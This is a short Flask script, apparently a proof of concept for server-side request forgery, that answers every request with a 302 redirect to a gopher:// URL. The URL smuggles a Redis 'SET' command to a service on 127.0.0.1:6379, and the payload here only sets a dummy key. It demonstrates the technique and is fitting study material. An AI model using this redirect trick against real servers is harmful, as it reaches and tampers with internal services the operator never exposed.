from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def get_route():
    # Redirect to a different URL
    #return redirect("http://127.0.0.1:80", code=302)
    return redirect("gopher://127.0.0.1:6379/_SET%20mykey%20myvalue",code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

